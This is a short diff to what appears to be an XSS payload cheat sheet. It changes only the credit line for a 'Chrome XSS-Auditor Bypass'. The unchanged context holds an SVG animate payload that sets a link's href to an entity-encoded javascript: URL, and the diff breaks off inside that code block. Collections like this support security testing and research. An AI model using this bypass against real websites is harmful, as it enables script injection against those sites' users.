@@ -1,6 +1,6 @@
 ## XSS
 
-**Chrome XSS-Auditor Bypass** by [Masato Kinugawa](https://github.com/masatokinugawa)
+**Chrome XSS-Auditor Bypass** by [@vivekchsm](https://twitter.com/vivekchsm)
 
 ```html
 <svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
